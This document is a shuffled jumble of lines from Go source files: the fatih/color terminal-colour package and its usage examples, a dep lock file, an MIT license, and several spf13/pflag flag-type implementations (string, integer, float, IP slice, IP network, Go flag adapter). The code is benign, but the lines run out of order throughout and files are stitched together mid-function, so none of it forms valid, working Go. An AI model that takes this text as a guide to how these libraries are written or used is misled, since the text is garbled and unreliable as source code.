"return fmt.Fprintln(w, a...)"
BgHiCyan
return c.wrap(fmt.Sprint(a...))
// colorized with color.Fprint().
// Red is a convenient helper function to print with red foreground. A
params  []Attribute
return c.format() 
"return colorString(format, FgHiGreen, a...)"
Bold
"func HiBlackString(format string, a ...interface{}) string {"
Color) EnableColor() {
// colorsCache is used to reduce the count of created Color objects and
package color
// HiWhite is a convenient helper function to print with hi-intensity white foreground. A
"// if not return the global option, which is disabled by default"
"""sync"""
// Magenta is a convenient helper function to print with magenta foreground.
func New(value ...Attribute) 
"func HiWhite(format string, a ...interface{}) { colorPrint(format, FgHiWhite, a...) }"
"func colorPrint(format string, p Attribute, a ...interface{}) {"
"return fmt.Fprintf(Output, format, a...)"
// Green is a convenient helper function to print with green foreground. A
FgMagenta
Color) PrintlnFunc() func(a ...interface{}) {
"return fmt.Fprint(w, a...)"
"func HiRed(format string, a ...interface{}) { colorPrint(format, FgHiRed, a...) }"
// PrintfFunc returns a new function that prints the passed arguments as
"const escape = """
// Println formats using the default formats for its operands and writes to
"func Magenta(format string, a ...interface{}) { colorPrint(format, FgMagenta, a...) }"
Color) SprintlnFunc() func(a ...interface{}) string {
// HiYellow is a convenient helper function to print with hi-intensity yellow foreground.
"func HiCyanString(format string, a ...interface{}) string { return colorString(format, FgHiCyan, a...) }"
func getCachedColor(p Attribute) 
// Cyan is a convenient helper function to print with cyan foreground. A
Color) attrExists(a Attribute) bool {
FgHiMagenta
"x1b"""
bool
func Set(p ...Attribute) 
"func RedString(format string, a ...interface{}) string { return colorString(format, FgRed, a...) }"
Unset()
"c.params = append(c.params, 0)"
"copy(c.params[1:], c.params[0:])"
// HiBlack is a convenient helper function to print with hi-intensity black foreground. A
"func Blue(format string, a ...interface{}) { colorPrint(format, FgBlue, a...) }"
"func Black(format string, a ...interface{}) { colorPrint(format, FgBlack, a...) }"
// false or true based on the stdout's file descriptor referring to a terminal
"c.Printf(format, a...)"
"func HiGreenString(format string, a ...interface{}) string {"
"fmt.Fprintf(Output, c.format())"
"func HiMagentaString(format string, a ...interface{}) string {"
"return strings.Join(format, """
"func HiCyan(format string, a ...interface{}) { colorPrint(format, FgHiCyan, a...) }"
"Color) Print(a ...interface{}) (n int, err error) {"
Error = colorable.NewColorableStderr()
c := New(p...)
"c.Fprintln(w, a...)"
// Equals returns a boolean value indicating whether two colors are equal.
Color) unformat() string {
FgYellow
// White is a convenient helper function to print with white foreground. A
Color) unsetWriter(w io.Writer) {
// output with the given SGR parameters until color.Unset() is called.
"if !strings.HasSuffix(format, """
// Fprintln formats using the default formats for its operands and writes to w.
colorsCacheMu.Lock()
"// an example output might be: ""1"
"return fmt.Fprintf(w, format, a...)"
"func MagentaString(format string, a ...interface{}) string {"
Output = colorable.NewColorableStdout()
// Fprint formats using the default formats for its operands and writes to w.
"c.Fprint(w, a...)"
// A newline is appended to format by default.
import (
 100
// Add is used to chain SGR parameters. Use as many as parameters to combine
"func HiBlack(format string, a ...interface{}) { colorPrint(format, FgHiBlack, a...) }"
BgWhite
BgHiMagenta
Color) SprintFunc() func(a ...interface{}) string {
"func BlackString(format string, a ...interface{}) string { return colorString(format, FgBlack, a...) }"
func (c 
"fmt.Fprintf(w, ""%s[%dm"", escape, Reset)"
"format := make([]string, len(c.params))"
// Foreground Hi-Intensity text colors
Color) Sprint(a ...interface{}) string {
// standard output. Spaces are always added between operands and a newline is
Color) Equals(c2 
// Blue is a convenient helper function to print with blue foreground. A
FgHiBlack Attribute = iota 
"// On Windows, users should wrap w with colorable.NewColorable() if w is of"
"return func(format string, a ...interface{}) string {"
defer c.unset()
// SprintfFunc returns a new function that returns colorized strings for the
// given arguments with fmt.Sprintf(). Useful to put into or mix into other
"return c.SprintfFunc()(format, a...)"
if len(c.params) != len(c2.params) {
colorsCacheMu sync.Mutex // protects colorsCache
"func HiMagenta(format string, a ...interface{}) { colorPrint(format, FgHiMagenta, a...) }"
"return fmt.Fprintln(Output, a...)"
os.File.
func Unset() {
Color)
// NoColor defines if the output is colorized or not. It's dynamically set to
BlinkRapid
// given arguments with fmt.Sprint(). Useful to put into or mix into other
// foreground.
return
if len(a) == 0 {
"func Green(format string, a ...interface{}) { colorPrint(format, FgGreen, a...) }"
func boolPtr(v bool) 
// CyanString is a convenient helper function to return a string with cyan
// Printf formats according to a format specifier and writes to standard output.
"return colorString(format, FgHiYellow, a...)"
defer colorsCacheMu.Unlock()
// Attribute defines a single SGR Code
// FprintFunc returns a new function that prints the passed arguments as
if NoColor {
// PrintFunc returns a new function that prints the passed arguments as
"""github.com/mattn/go-isatty"""
// string. It returns the number of bytes written and any write error
"func Yellow(format string, a ...interface{}) { colorPrint(format, FgYellow, a...) }"
"x1b[...m"""
// encountered. This is the standard fmt.Print() method wrapped with the given
    // Use your own io.Writer output
"    blue(myWriter, ""important notice: %s"", stars)"
standard output to the given parameters. That way a rewrite of an existing
    // Use handy standard colors.
"    red(""error: %s"", err)"
"n"", info(""package""))"
disable/enable color output on the fly:
that suits you.
suppose you have a CLI app and a 
"    color.Magenta(""And many others .."")"
"    var flagNoColor = flag.Bool(""no-color"", false, ""Disable color output"")"
"    red(""warning"")"
Windows support is enabled by default. All Print functions work as intended.
You can also FprintXxx functions to pass your own io.Writer:
However there are times where custom color mixes are required. Below are some
 bool flag. You can easily disable
"    d.Printf(""This prints bold cyan %s"
"    d := color.New(color.FgCyan, color.Bold)"
code is not required.
    blue := color.New(FgBlue).FprintfFunc()
"    color.Blue(""Prints %s in blue."", ""text"")"
"    // Mix up foreground and background colors, create new mixes!"
"    whiteBackground.Println(""Red text with White background."")"
Use simple and default helper functions with predefined foreground colors:
"    notice := color.New(color.Bold, color.FgGreen).PrintlnFunc()"
disable colors both globally and for single color definition. For example
"    fmt.Println(""Existing text will be now in Yellow"")"
    // Create a custom print function for convenient
"    color.New(color.FgBlue).Fprintln(myWriter, ""blue color!"")"
    // a newline will be appended automatically
"    fmt.Printf(""this is a %s and this is %s."
    // Create a new color object
    // Mix up with multiple attributes
    red := color.New(color.FgRed).PrintfFunc()
"n"", ""too!."")"
"    success := color.New(color.Bold, color.FgGreen).FprintlnFunc()"
    // You can mix up parameters
"However only for color.SprintXXX functions, user should use fmt.FprintXXX and"
"     c.Println(""Prints cyan text"")"
color.NoColor = true // disables colorized output
    }
There might be a case where you want to disable color output (for example to
"    color.Cyan(""Prints text in cyan."")"
"    fmt.Fprintf(color.Output, ""this %s rocks!"
"    boldRed.Println(""This will print text in bold red."")"
    boldRed := red.Add(color.Bold)
It also has support for single color definitions (local). You can
    red := color.New(color.FgRed)
You can create PrintXxx functions to simplify even more:
Or create SprintXxx functions to mix strings with other non-colorized strings:
"n"", yellow(""warning""), red(""error""))"
"    notice(""don't forget this..."")"
    defer color.Unset() // use it in your function
set the output to color.Output:
     c.EnableColor()
"    color.HiGreen(""Bright green color."")"
    // More default foreground colors..
"    color.Red(""We have red"")"
"    fmt.Printf(""this %s rocks!"
"    fmt.Println(""All text will be now bold magenta."")"
"    success(myWriter, don't forget this..."")"
    // Or just add them to New()
"    color.Set(color.FgMagenta, color.Bold)"
    if 
Color
     c.DisableColor()
"output to the standard output. The API can be used in several way, pick one"
    yellow := New(FgYellow).SprintFunc()
    color.Unset() // don't forget to unset
"    c.Println(""Prints cyan text with an underline."")"
    // Mix up multiple attributes
    red := New(FgRed).SprintFunc()
    blue := color.New(color.FgBlue)
"    info := New(FgWhite, BgGreen).SprintFunc()"
    // Hi-intensity colors
flagNoColor {
examples to create custom color objects and use the print functions of each
"n"", ""too"")"
    color.Set(color.FgYellow)
the color output with:
"    blue.Fprint(myWriter, ""This will print text in blue."")"
separate color object.
"    color.Yellow(""Yellow color too!"")"
"    color.HiWhite(""Shiny white color!"")"
pipe the standard output of your app to somewhere else). 
 has support to
package color
"    fmt.Printf(""This one %s"
Package color is an ANSI color package to output colorized or SGR defined
    c := color.New(color.FgCyan).Add(color.Underline)
"    fmt.Fprintf(color.Output, ""Windows support: %s"", color.GreenString(""PASS""))"
Using with existing code is possible. Just use the Set() method to set the
--no-color
     c := color.New(color.FgCyan)
"     c.Println(""This prints again cyan..."")"
    whiteBackground := red.Add(color.BgWhite)
"     c.Println(""This is printed without any color"")"
"    color.HiBlack(""Bright black means gray.."")"
    
language: go
 - tip
 - 1.8.x
go: 
"  revision = ""37707fdb30a5b38865cfb95e5aab41707daec7fd"""
  analyzer-version = 1
"  name = ""github.com/mattn/go-colorable"""
"  version = ""v0.0.9"""
"  branch = ""master"""
"  version = ""v0.0.3"""
"  name = ""golang.org/x/sys"""
" This file is autogenerated, do not edit"
"  inputs-digest = ""e8a50671c3cb93ea935bf210b1cd20702876b9d9226129be581ef646d1565cdc"""
"  packages = [""unix""]"
"  revision = ""167de6bfdfba052fa6b2d3664c8f5272e23c9072"""
"  packages = ["".""]"
[solve-meta]
"  analyzer-name = ""dep"""
"  solver-name = ""gps-cdcl"""
 changes may be undone by the next 'dep ensure'.
[[projects]]
"  name = ""github.com/mattn/go-isatty"""
"  revision = ""0360b2af4f38e8d38c7fce2a9f4e702702d73a39"""
  solver-version = 1
Copyright (c) 2013 Fatih Arslan
"this software and associated documentation files (the ""Software""), to deal in"
copies or substantial portions of the Software.
"the Software, and to permit persons to whom the Software is furnished to do so,"
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS"
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of"
"COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER"
The MIT License (MIT)
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN"
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"the Software without restriction, including without limitation the rights to"
"FlagSet) GetString(name string) (string, error) {"
"func newStringValue(val string, p "
string {
"string, name, shorthand string, value string, usage string) {"
stringValue) Set(val string) error {
"// StringVarP is like StringVar, but accepts a shorthand letter that can be used after a single dash."
"// String defines a string flag with specified name, default value, and usage string."
func StringVarP(p 
string) 
s = stringValue(val)
stringValue {
"return CommandLine.StringP(name, shorthand, value, usage)"
FlagSet) StringVar(p 
"func String(name string, value string, usage string) "
FlagSet) StringVarP(p 
p := new(string)
p = val
"// StringVar defines a string flag with specified name, default value, and usage string."
"CommandLine.VarP(newStringValue(value, p), name, """", usage)"
package pflag
return nil
"return CommandLine.StringP(name, """", value, usage)"
"func StringP(name, shorthand string, value string, usage string) "
// GetString return the string value of a flag with the given name
"func stringConv(sval string) (interface{}, error) {"
"return ""string"""
stringValue) Type() string {
"return val.(string), nil"
stringValue) String() string { return string(
"return """", err"
"// StringP is like String, but accepts a shorthand letter that can be used after a single dash."
func (s 
type stringValue string
"val, err := f.getFlagType(name, ""string"", stringConv)"
"return sval, nil"
stringValue)(p)
// -- string Value
"FlagSet) String(name string, value string, usage string) "
"f.VarP(newStringValue(value, p), name, shorthand, usage)"
"f.StringVarP(p, name, """", value, usage)"
return (
"string, name string, value string, usage string) {"
// The argument p points to a string variable in which to store the value of the flag.
"CommandLine.VarP(newStringValue(value, p), name, shorthand, usage)"
"FlagSet) StringP(name, shorthand string, value string, usage string) "
if err != nil {
// The return value is the address of a string variable that stores the value of the flag.
"f.StringVarP(p, name, shorthand, value, usage)"
func StringVar(p 
return p
"f.VarP(newStringValue(value, p), name, """", usage)"
s) }
func (f 
type float32Value float32
"CommandLine.VarP(newFloat32Value(value, p), name, shorthand, usage)"
"return float32(v), nil"
"FlagSet) Float32P(name, shorthand string, value float32, usage string) "
// The return value is the address of a float32 variable that stores the value of the flag.
"// Float32P is like Float32, but accepts a shorthand letter that can be used after a single dash."
"// Float32VarP is like Float32Var, but accepts a shorthand letter that can be used after a single dash."
"CommandLine.VarP(newFloat32Value(value, p), name, """", usage)"
// -- float32 Value
"func Float32(name string, value float32, usage string) "
"float32, name, shorthand string, value float32, usage string) {"
f = float32Value(v)
func Float32Var(p 
p = val
"v, err := strconv.ParseFloat(s, 32)"
package pflag
"return 0, err"
"return ""float32"""
float32Value {
float32Value) String() string { return strconv.FormatFloat(float64(
"return val.(float32), nil"
"f.Float32VarP(p, name, shorthand, value, usage)"
FlagSet) Float32Var(p 
"f.VarP(newFloat32Value(value, p), name, """", usage)"
// GetFloat32 return the float32 value of a flag with the given name
FlagSet) Float32VarP(p 
"float32, name string, value float32, usage string) {"
"f.VarP(newFloat32Value(value, p), name, shorthand, usage)"
float32Value) Set(s string) error {
return err
float32 {
"f.Float32VarP(p, name, """", value, usage)"
// The argument p points to a float32 variable in which to store the value of the flag.
"val, err := f.getFlagType(name, ""float32"", float32Conv)"
"func newFloat32Value(val float32, p "
float32) 
"// Float32Var defines a float32 flag with specified name, default value, and usage string."
"return CommandLine.Float32P(name, shorthand, value, usage)"
"FlagSet) Float32(name string, value float32, usage string) "
"return CommandLine.Float32P(name, """", value, usage)"
"f), 'g', -1, 32) }"
"v, err := strconv.ParseFloat(sval, 32)"
"FlagSet) GetFloat32(name string) (float32, error) {"
return (
"func Float32P(name, shorthand string, value float32, usage string) "
p := new(float32)
"import ""strconv"""
"func float32Conv(sval string) (interface{}, error) {"
float32Value) Type() string {
if err != nil {
"// Float32 defines a float32 flag with specified name, default value, and usage string."
float32Value)(p)
func Float32VarP(p 
return p
func (f 
FlagSet) Uint8Var(p 
"CommandLine.VarP(newUint8Value(value, p), name, shorthand, usage)"
"val, err := f.getFlagType(name, ""uint8"", uint8Conv)"
uint8) 
"FlagSet) Uint8(name string, value uint8, usage string) "
"f.Uint8VarP(p, name, shorthand, value, usage)"
"// Uint8Var defines a uint8 flag with specified name, default value, and usage string."
uint8Value {
uint8Value) String() string { return strconv.FormatUint(uint64(
uint8Value) Type() string {
"f.VarP(newUint8Value(value, p), name, """", usage)"
"uint8, name, shorthand string, value uint8, usage string) {"
"func Uint8(name string, value uint8, usage string) "
p := new(uint8)
"func uint8Conv(sval string) (interface{}, error) {"
"CommandLine.VarP(newUint8Value(value, p), name, """", usage)"
func Uint8VarP(p 
"// Uint8P is like Uint8, but accepts a shorthand letter that can be used after a single dash."
p = val
"FlagSet) GetUint8(name string) (uint8, error) {"
uint8Value)(p)
package pflag
func (i 
func Uint8Var(p 
"return 0, err"
"return CommandLine.Uint8P(name, """", value, usage)"
"// Uint8 defines a uint8 flag with specified name, default value, and usage string."
"return uint8(v), nil"
"func Uint8P(name, shorthand string, value uint8, usage string) "
uint8Value) Set(s string) error {
uint8 {
"f.VarP(newUint8Value(value, p), name, shorthand, usage)"
// -- uint8 Value
type uint8Value uint8
"v, err := strconv.ParseUint(s, 0, 8)"
"return val.(uint8), nil"
"uint8, name string, value uint8, usage string) {"
"FlagSet) Uint8P(name, shorthand string, value uint8, usage string) "
"return ""uint8"""
"v, err := strconv.ParseUint(sval, 0, 8)"
return err
"// Uint8VarP is like Uint8Var, but accepts a shorthand letter that can be used after a single dash."
"return CommandLine.Uint8P(name, shorthand, value, usage)"
// The return value is the address of a uint8 variable that stores the value of the flag.
// GetUint8 return the uint8 value of a flag with the given name
return (
"import ""strconv"""
"func newUint8Value(val uint8, p "
i = uint8Value(v)
if err != nil {
// The argument p points to a uint8 variable in which to store the value of the flag.
"i), 10) }"
return p
"f.Uint8VarP(p, name, """", value, usage)"
FlagSet) Uint8VarP(p 
func (f 
FlagSet) Uint64VarP(p 
func Uint64Var(p 
"// Uint64VarP is like Uint64Var, but accepts a shorthand letter that can be used after a single dash."
"func Uint64P(name, shorthand string, value uint64, usage string) "
"func uint64Conv(sval string) (interface{}, error) {"
"CommandLine.VarP(newUint64Value(value, p), name, shorthand, usage)"
"uint64, name string, value uint64, usage string) {"
uint64Value {
"CommandLine.VarP(newUint64Value(value, p), name, """", usage)"
"// Uint64Var defines a uint64 flag with specified name, default value, and usage string."
uint64Value) Type() string {
// The return value is the address of a uint64 variable that stores the value of the flag.
// GetUint64 return the uint64 value of a flag with the given name
"func newUint64Value(val uint64, p "
"f.VarP(newUint64Value(value, p), name, shorthand, usage)"
uint64Value) String() string { return strconv.FormatUint(uint64(
p = val
"FlagSet) Uint64P(name, shorthand string, value uint64, usage string) "
// The argument p points to a uint64 variable in which to store the value of the flag.
package pflag
func (i 
FlagSet) Uint64Var(p 
"return 0, err"
func Uint64VarP(p 
"f.Uint64VarP(p, name, """", value, usage)"
"// Uint64P is like Uint64, but accepts a shorthand letter that can be used after a single dash."
p := new(uint64)
"// Uint64 defines a uint64 flag with specified name, default value, and usage string."
"return ""uint64"""
"return val.(uint64), nil"
"return CommandLine.Uint64P(name, """", value, usage)"
return err
"FlagSet) Uint64(name string, value uint64, usage string) "
uint64 {
"return CommandLine.Uint64P(name, shorthand, value, usage)"
"v, err := strconv.ParseUint(s, 0, 64)"
"val, err := f.getFlagType(name, ""uint64"", uint64Conv)"
uint64) 
uint64Value)(p)
"func Uint64(name string, value uint64, usage string) "
// -- uint64 Value
"uint64, name, shorthand string, value uint64, usage string) {"
type uint64Value uint64
return (
"f.VarP(newUint64Value(value, p), name, """", usage)"
"import ""strconv"""
if err != nil {
"f.Uint64VarP(p, name, shorthand, value, usage)"
"FlagSet) GetUint64(name string) (uint64, error) {"
uint64Value) Set(s string) error {
"i), 10) }"
return p
"return uint64(v), nil"
i = uint64Value(v)
"v, err := strconv.ParseUint(sval, 0, 64)"
func (f 
"for i, sval := range ss {"
[]net.IP
"for i, ip := range "
"out := make([]net.IP, 0, len(ipStrSlice))"
"[]net.IP, name string, value []net.IP, usage string) {"
"func IPSlice(name string, value []net.IP, usage string) "
// Emtpy string would cause a slice with one (empty) entry
ip := net.ParseIP(strings.TrimSpace(ipStr))
ipSliceValue) String() string {
ipStrSlice[i] = ip.String()
ipSliceValue) Set(val string) error {
return nil
"ss := strings.Split(val, "","")"
"return out, nil"
"f.VarP(newIPSliceValue(value, p), name, shorthand, usage)"
ipsv.value = p
"return ""ipSlice"""
""", """")"
"ipStrSlice := make([]string, len("
"FlagSet) GetIPSlice(name string) ([]net.IP, error) {"
FlagSet) IPSliceVarP(p 
"return val.([]net.IP), nil"
 out 
"""strings"""
"// If Set is called on a flag that already has a []net.IP assigned, the newly converted values will be appended."
ipsv.value = val
// GetIPSlice returns the []net.IP value of a flag with the given name
// read flag arguments with CSV parser
value   
type ipSliceValue struct {
"// IPSliceVar defines a ipSlice flag with specified name, default value, and usage string."
"// IPSlice defines a []net.IP flag with specified name, default value, and usage string."
package pflag
// The return value is the address of a []net.IP variable that stores the value of the flag.
if err != nil 
ipsv := new(ipSliceValue)
rmQuote := strings.NewReplacer(
return err
FlagSet) IPSliceVar(p 
} else {
out[i] = ip
"return CommandLine.IPSliceP(name, """", value, usage)"
"out = append(out, ip)"
if len(val) == 0 {
if err != nil {
return ipsv
func IPSliceVar(p 
s.changed = true
"[]net.IP, name, shorthand string, value []net.IP, usage string) {"
s.value))
"""fmt"""
"// Set converts, and assigns, the comma-separated IP argument string representation as the []net.IP value of this flag."
import (
"return fmt.Errorf(""invalid string being converted to IP address: %s"", ipStr)"
"// IPSliceP is like IPSlice, but accepts a shorthand letter that can be used after a single dash."
 err != io.EOF {
// remove all quote characters
"return nil, fmt.Errorf(""invalid string being converted to IP address: %s"", sval)"
"for _, ipStr := range ipStrSlice {"
// Type returns a string that uniquely represents this flag's type.
"// IPSliceVarP is like IPSliceVar, but accepts a shorthand letter that can be used after a single dash."
", """", "
"out, _ := writeAsCSV(ipStrSlice)"
[]net.IP {
"""net"""
p := []net.IP{}
ipSliceValue) Type() string {
"CommandLine.VarP(newIPSliceValue(value, p), name, """", usage)"
if !s.changed {
"p, name, shorthand, value, usage)"
"val, err := f.getFlagType(name, ""ipSlice"", ipSliceConv)"
"return []net.IP{}, nil"
changed bool
"CommandLine.VarP(newIPSliceValue(value, p), name, shorthand, usage)"
"out := make([]net.IP, len(ss))"
s.value {
// The argument p points to a []net.IP variable in which to store the value of the flag.
ipSliceValue {
[]net.IP) 
" ""]"""
return 
"// IPSliceVar defines a []net.IP flag with specified name, default value, and usage string."
"func newIPSliceValue(val []net.IP, p "
"return []net.IP{}, err"
func (f 
"FlagSet) IPSlice(name string, value []net.IP, usage string) "
"p, name, """", value, usage)"
"return CommandLine.IPSliceP(name, shorthand, value, usage)"
s.value = out
"func IPSliceP(name, shorthand string, value []net.IP, usage string) "
"// String defines a ""native"" format for this net.IP slice flag value."
"""io"""
"ipStrSlice, err := readAsCSV(rmQuote.Replace(val))"
"func ipSliceConv(val string) (interface{}, error) {"
// The return value is the address of a []net.IP variable that stores the value of that flag.
f.IPSliceVarP(
func (s 
"FlagSet) IPSliceP(name, shorthand string, value []net.IP, usage string) "
func IPSliceVarP(p 
// -- ipSlice Value
"return ""["" "
if ip == nil {
"val = strings.Trim(val, ""[]"")"
"f.VarP(newIPSliceValue(value, p), name, """", usage)"
ip := net.ParseIP(strings.TrimSpace(sval))
s.value = append(
"s.value, out...)"
// parse ip values into slice
", """", """
"CommandLine.VarP(newFloat64Value(value, p), name, shorthand, usage)"
"// Float64VarP is like Float64Var, but accepts a shorthand letter that can be used after a single dash."
"// Float64 defines a float64 flag with specified name, default value, and usage string."
"f.VarP(newFloat64Value(value, p), name, """", usage)"
"FlagSet) Float64P(name, shorthand string, value float64, usage string) "
func Float64VarP(p 
// The return value is the address of a float64 variable that stores the value of the flag.
f = float64Value(v)
"return CommandLine.Float64P(name, shorthand, value, usage)"
"func float64Conv(sval string) (interface{}, error) {"
// -- float64 Value
type float64Value float64
float64Value) Set(s string) error {
"FlagSet) GetFloat64(name string) (float64, error) {"
p = val
"v, err := strconv.ParseFloat(s, 64)"
float64Value)(p)
// The argument p points to a float64 variable in which to store the value of the flag.
"float64, name, shorthand string, value float64, usage string) {"
"FlagSet) Float64(name string, value float64, usage string) "
package pflag
"return CommandLine.Float64P(name, """", value, usage)"
"return 0, err"
"f.VarP(newFloat64Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newFloat64Value(value, p), name, """", usage)"
"return strconv.ParseFloat(sval, 64)"
"val, err := f.getFlagType(name, ""float64"", float64Conv)"
"return val.(float64), nil"
"// Float64P is like Float64, but accepts a shorthand letter that can be used after a single dash."
// GetFloat64 return the float64 value of a flag with the given name
return err
float64Value {
"f), 'g', -1, 64) }"
float64 {
"func Float64(name string, value float64, usage string) "
"// Float64Var defines a float64 flag with specified name, default value, and usage string."
float64Value) Type() string {
float64) 
"float64, name string, value float64, usage string) {"
"return ""float64"""
func (f 
FlagSet) Float64VarP(p 
func Float64Var(p 
return (
"func Float64P(name, shorthand string, value float64, usage string) "
"import ""strconv"""
if err != nil {
p := new(float64)
FlagSet) Float64Var(p 
"f.Float64VarP(p, name, """", value, usage)"
return p
"f.Float64VarP(p, name, shorthand, value, usage)"
"func newFloat64Value(val float64, p "
float64Value) String() string { return strconv.FormatFloat(float64(
p := new(int32)
// The argument p points to an int32 variable in which to store the value of the flag.
// The return value is the address of an int32 variable that stores the value of the flag.
"v, err := strconv.ParseInt(s, 0, 32)"
"return int32(v), nil"
"f.Int32VarP(p, name, """", value, usage)"
int32Value)(p)
func Int32VarP(p 
"// Int32P is like Int32, but accepts a shorthand letter that can be used after a single dash."
"func newInt32Value(val int32, p "
"return CommandLine.Int32P(name, shorthand, value, usage)"
"func Int32(name string, value int32, usage string) "
"FlagSet) Int32P(name, shorthand string, value int32, usage string) "
"func int32Conv(sval string) (interface{}, error) {"
int32Value {
"f.VarP(newInt32Value(value, p), name, shorthand, usage)"
p = val
"// Int32 defines an int32 flag with specified name, default value, and usage string."
package pflag
"return ""int32"""
func (i 
i = int32Value(v)
type int32Value int32
"return 0, err"
FlagSet) Int32Var(p 
"CommandLine.VarP(newInt32Value(value, p), name, shorthand, usage)"
"val, err := f.getFlagType(name, ""int32"", int32Conv)"
"return val.(int32), nil"
FlagSet) Int32VarP(p 
"CommandLine.VarP(newInt32Value(value, p), name, """", usage)"
"return CommandLine.Int32P(name, """", value, usage)"
"FlagSet) GetInt32(name string) (int32, error) {"
func Int32Var(p 
// -- int32 Value
"FlagSet) Int32(name string, value int32, usage string) "
return err
"func Int32P(name, shorthand string, value int32, usage string) "
int32Value) Type() string {
"// Int32Var defines an int32 flag with specified name, default value, and usage string."
int32) 
"f.Int32VarP(p, name, shorthand, value, usage)"
int32Value) Set(s string) error {
"// Int32VarP is like Int32Var, but accepts a shorthand letter that can be used after a single dash."
"int32, name string, value int32, usage string) {"
return (
"v, err := strconv.ParseInt(sval, 0, 32)"
"import ""strconv"""
if err != nil {
// GetInt32 return the int32 value of a flag with the given name
"f.VarP(newInt32Value(value, p), name, """", usage)"
"i), 10) }"
"int32, name, shorthand string, value int32, usage string) {"
return p
int32Value) String() string { return strconv.FormatInt(int64(
int32 {
func (f 
flagValueWrapper{
// reflection.
"// Ex: if the golang flag was -v, allow both -v and --v to work"
// AddGoFlagSet will add the given 
IsBoolFlag() bool
) it will be accessiblei
Flag{
flagValueWrapper) String() string {
--verbose
flag.Flag
// with both 
newflag := PFlagFromGoFlag(goflag)
return v.inner.String()
f.addedGoFlagSets = make([]
flagType string
f.AddGoFlag(goflag)
flag := 
if len(flag.Name) == 1 {
// character (ex: 
 t.Kind() == reflect.Ptr {
func wrapFlagValue(v goflag.Value) Value {
flag.Flag.Name was a single character (ex: 
 it won't change.
// If the 
t := reflect.TypeOf(v)
"""strings"""
goflag.Flag) {
 ok 
goflag.FlagSet) {
return pv
"if fv, ok := goflag.Value.(goBoolFlag)"
"// If the flag.Value happens to also be a pflag.Value, just use it directly."
"flag.NoOptDefVal = ""true"""
// difference here is the addition of the Type method that returns a string
package pflag
"goflag ""flag"""
// Looks like golang flags don't set DefValue correctly  :-(
"inner: v,"
 in flags. If the golang flag was more than a single
// license that can be found in the LICENSE file.
flag.Shorthand = flag.Name
func PFlagFromGoFlag(goflag 
// AddGoFlag will add the given 
f.AddFlag(newflag)
 ok {
"// they use to decide if a flag should get ""true"" when no arg is given."
inner    goflag.Value
goflag.Flag) 
import (
"Value: wrapFlagValue(goflag.Value),"
if f.addedGoFlagSets == nil {
"if pv, ok := v.(Value)"
"""reflect"""
FlagSet) AddGoFlag(goflag 
verbose
FlagSet) AddGoFlagSet(newSet 
// We are just copying the boolFlag interface out of goflag as that is what
"DefValue: goflag.Value.String(),"
) it will only be accessible via 
Flag {
// flagValueWrapper implements pflag.Value around a flag.Value.  The main
if f.Lookup(goflag.Name) != nil {
func (v 
"// name of the type.  As this is generally unknown, we approximate that with"
func (f 
"Usage: goflag.Usage,"
return flag
flagValueWrapper) Set(s string) error {
goflag.Value
newSet.VisitAll(func(goflag 
flag.FlagSet to the pflag.FlagSet
 and 
flagValueWrapper) Type() string {
// PFlagFromGoFlag will return a 
"goflag.FlagSet, 0)"
"Name:  goflag.Name,"
return v.flagType
flag.Flag to the pflag.FlagSet
pflag.Flag given a 
// Use of this source code is governed by a BSD-style
"//DefValue: goflag.DefValue,"
pv := 
type goBoolFlag interface {
 fv.IsBoolFlag() {
// Remember the default value as a string
return
type flagValueWrapper struct {
"pv.flagType = strings.TrimSuffix(t.Name(), ""Value"")"
t = t.Elem()
"f.addedGoFlagSets = append(f.addedGoFlagSets, newSet)"
return v.inner.Set(s)
if t.Kind() == reflect.Interface 
// Copyright 2009 The Go Authors. All rights reserved.
if newSet == nil {
"return ""ipNet"""
"""fmt"""
"func IPNet(name string, value net.IPNet, usage string) "
// GetIPNet return the net.IPNet value of a flag with the given name
"FlagSet) GetIPNet(name string) (net.IPNet, error) {"
"CommandLine.VarP(newIPNetValue(value, p), name, shorthand, usage)"
import (
"val, err := f.getFlagType(name, ""ipNet"", ipNetConv)"
"return nil, fmt.Errorf(""invalid string being converted to IPNet: %s"", sval)"
if err == nil {
"CommandLine.VarP(newIPNetValue(value, p), name, """", usage)"
// The return value is the address of an net.IPNet variable that stores the value of the flag.
"// IPNetP is like IPNet, but accepts a shorthand letter that can be used after a single dash."
ipNetValue) Type() string {
FlagSet) IPNetVar(p 
"return net.IPNet{}, err"
"f.VarP(newIPNetValue(value, p), name, """", usage)"
func IPNetVarP(p 
"net.IPNet, name, shorthand string, value net.IPNet, usage string) {"
"f.VarP(newIPNetValue(value, p), name, shorthand, usage)"
"_, n, err := net.ParseCIDR(strings.TrimSpace(value))"
type ipNetValue net.IPNet
"n, nil"
"net.IPNet, name string, value net.IPNet, usage string) {"
p := new(net.IPNet)
p = val
"return CommandLine.IPNetP(name, """", value, usage)"
"// IPNet defines an net.IPNet flag with specified name, default value, and usage string."
"""net"""
package pflag
"return val.(net.IPNet), nil"
ipNetValue {
return nil
func (ipnet 
"return CommandLine.IPNetP(name, shorthand, value, usage)"
net.IPNet) 
func (ipnet ipNetValue) String() string {
// The argument p points to an net.IPNet variable in which to store the value of the flag.
"FlagSet) IPNetP(name, shorthand string, value net.IPNet, usage string) "
return err
"f.IPNetVarP(p, name, shorthand, value, usage)"
"// IPNetVar defines an net.IPNet flag with specified name, default value, and usage string."
ipNetValue)(p)
"_, n, err := net.ParseCIDR(strings.TrimSpace(sval))"
func IPNetVar(p 
ipNetValue) Set(value string) error {
ipnet = ipNetValue(
"f.IPNetVarP(p, name, """", value, usage)"
// IPNet adapts net.IPNet for use as a flag.
func (f 
return (
n := net.IPNet(ipnet)
if err != nil {
FlagSet) IPNetVarP(p 
net.IPNet {
"func IPNetP(name, shorthand string, value net.IPNet, usage string) "
return n.String()
"""strings"""
